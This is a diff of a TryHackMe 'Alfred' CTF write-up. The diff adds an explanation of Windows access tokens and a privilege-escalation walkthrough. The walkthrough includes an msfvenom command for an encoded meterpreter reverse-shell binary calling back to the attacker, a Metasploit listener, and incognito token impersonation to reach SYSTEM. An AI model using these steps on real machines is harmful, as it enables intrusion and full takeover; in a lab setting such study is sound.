@@ -4,12 +4,12 @@ description: Exploit Jenkins to gain an initial shell, then escalate your privil
 title: Tryhackme Alfred CTF Writeup
 date: 2021-12-28 11:40
 image: '/assets/img/posts/tryhackme-alfred-ctf-writeup/alfredbanner.png'
-tags: [TryHackme-Machines]
+tags: [TryHackme-Machines,ctf,pentesting,metasploit,mindows-privesc,windows-tokens,bruteforce,remote-code-execution]
 featured: false
 ---
 
 
-# Enumeration
+# ENUMERATION
 
 Run Network Mapper (**nmap**) on Alfred machine to discover opened ports and services.   
 
@@ -65,7 +65,7 @@ If you google it, you will see the default login credentials for Jenkins is **ad
 However, the system administrator could have changed the password to a different one. In that case default credentials
 would be useless. So we will brute force the credentials for best practice.<br>
 
-# Exploitation
+# EXPLOITATION
 
 In order to create a continuous HTTP request, we have to know how the HTTP request looks.
 Launch the [**Burp Suite**](https://www.geeksforgeeks.org/what-is-burp-suite/) to examine the HTTP POST request sent 
@@ -146,5 +146,156 @@ To get user flag, run:
 type "C:\Users\Bruce\Desktop\user.txt"
 {% endhighlight%}
 
-# Privilege Escelation
-To be continued...
+# WINDOWS TOKENS
+This machine focuses on the Windows access tokens and escalate privileges with them.
+
+## What is an access token ?
+
+An access token consists of:
+- Privileges
+- Group SIDs(security identifier)
+- User SIDs
+amongst other things.
+[**Much more detailed information here.**](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
+
+An [access token](https://docs.microsoft.com/en-us/windows/win32/secgloss/a-gly) contains the security 
+information for a logon session. The system creates an access token when a user logs on, and every process 
+executed on behalf of the user has a copy of the token. The token identifies the user, the user's groups, 
+and the user's privileges. The system uses the token to control access to securable objects and to control 
+the ability of the user to perform various system-related operations on the local computer. 
+There are two kinds of access token, **primary** and **impersonation**.
+<br><br>There are two types access tokens, according to [**Windows Docs**](https://docs.microsoft.com/en-us/):
+- [Primary tokens](https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly): An access token that is typically created 
+only by the Windows kernel. It may be assigned to a process to represent the default security information for that process.
+- [Impersonation tokens](https://docs.microsoft.com/en-us/windows/win32/secgloss/i-gly): An access token that has been created 
+to capture the security information of a client process, allowing a server to "impersonate" the client 
+process in security operations. It becomes convenient when you are the local admin on a system and want to
+impersonate another logged on client, e.g. a domain admin.
+<br><br>There are four levels for impersonation token:
+    - **SecurityAnonymous**: current user/account/client cannot impersonate another user/account/client.
+    - **SecurityIdentification**: current user/account/client can get the privileges and identity of a user, but cannot impersonate the user.
+    - **SecurityImpersonation**: current user/account/client can impersonate user's security context on the local system.
+    - **SecurityDelegation**: current user/account/client can impersonate user's security context on a remote system.
+
+The security context is a data structure that stores clients' security information.
+
+### Diffrence between proceesses hierarchy in UNIX and Windows
+### unix
+In UNIX like operating systems, there is the child-parent process hierarchy. Whenever a process
+creates a new process, the creating process becomes the parent while created process becomes the child. And the child process
+inherits all the permissions from its' parent. If the parent dies, the child becomes an [orphan or zombie process](https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c/).
+
+### windows
+
+The parent-child relationship does not exist for the Windows environment. 
+However, I will refer to them as parent-child to facilitate the explanation.
+Whenever a new process is initiated, the parent process receives an ID and the process handler of the child process.
+It simulates the hierarchial relationship if the application requires it to do so. The child process copies the access 
+token of its' parent which is created by **LSASS.exe** on logon. However, windows treats all processes as belonging to the 
+same generation. 
+
+#### what is the LSASS.exe ?
+LSASS.exe, **Local Security Authority Process**, is responsible for authenticating accounts
+in the WinLogon service. The process is operated by using authentication packages such as the default msgina.dll. When the user
+authenticates, lsass.exe generates a **user access token**, which is then used to launch the initial shell. **Other processes that
+the account initiates inherit from this token**.
+
+### commons
+Both Windows and UNIX processes inherit the security settings of the creating process by default.
+Signals, Exceptions, and Events.
+
+
+# PRIVILEGE ESCALATION
+
+After gaining the initial access to the target machine, the first step will be to check the account's permissions on the system.
+
+<br>Run: **whoami /priv**
+{% highlight powershell %}
+
+C:\Program Files (x86)\Jenkins\workspace\project> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled <--
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled <--
+SeCreateGlobalPrivilege         Create global objects                     Enabled <--
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+
+{% endhighlight %}
+
+Those are the privileges of the current user which are inherited from a group or given to the account when created. 
+However, only three of them stated as _Enabled_.
+<br><br>[Here](https://github.com/gtworek/Priv2Admin) is the full list of exploitable privileges.
+<br>And [here](https://www.exploit-db.com/papers/42556) is the detailed documentation of abusing token privileges.
+<br>Also a great video resource [here](https://www.youtube.com/watch?v=QRpfvmMbDMg) about token handling vulnerabilities.
+
+We will need a module called [incognito](https://labs.f-secure.com/archive/incognito-v2-0-released/).
+Therefore I will use **Metasploit Framework** while it has the incognito module built-in.
+
+The one I will be exploiting is the **SeImpersonatePrivilege**.
+Follow these steps to get [NT AUTHORITY\SYSTEM](https://superuser.com/questions/471769/what-is-the-nt-authority-system-user) privileges.
+- Create a meterpreter reverse shell binary.
+{% highlight bash %}
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST={THM IP} LPORT={SOME FREE PORT}-f exe -o ashell.exe
+{% endhighlight %}
+- Upload the executable to the target machine.
+- Start a reverse tcp listener with metasploit:
+{% highlight bash %}
+msfconsole -q
+msf6 use exploit exploit/multi/handler
+msf6 set payload windows/meterpreter/reverse_tcp
+msf6 set LHOST {THM IM}
+msf6 set LPORT {THE PORT DECLARED FOR EXECUTABLE BEFORE}
+msf6 run
+{% endhighlight %}
+![](/assets/img/posts/tryhackme-alfred-ctf-writeup/16.png)
+- After successfully receiving the meterpreter console, load the incognito module.
+<br>Run:
+{% highlight bash %}
+msf6 load incognito
+{% endhighlight %}
+![](/assets/img/posts/tryhackme-alfred-ctf-writeup/17.png)<br>
+Then, list all the available tokens:
+{% highlight bash %}
+list_tokens -g
+{% endhighlight %}
+There will be a delegation token called "BULTIN\Administrators". We will impersonate that token.
+Delegation and impersonation levels are identical locally.
+- Run:
+{% highlight bash %}
+impersonate_token "BUILTIN\Administrators"
+{% endhighlight %}
+If everything were successfully done, **NT AUTHORITY\SYSTEM** should be the output of the **getuid** command.
+![](/assets/img/posts/tryhackme-alfred-ctf-writeup/18.png)
+- Run **ps** to list all processes. Find one running with NT AUTHORITY\SYSTEM privileges, than migrate meterpreter process into it.
+![](/assets/img/posts/tryhackme-alfred-ctf-writeup/19.png)
+By doing that, we have camouflaged our malicious process into a safer looking one.
+<br>![](/assets/img/posts/tryhackme-alfred-ctf-writeup/20.png)
+<br>To get the root flag, run:
+{% highlight bash %}
+cat "C:\Windows\system32\config\root.txt"
+{% endhighlight %}
+<br>
+Thanks for reading :)
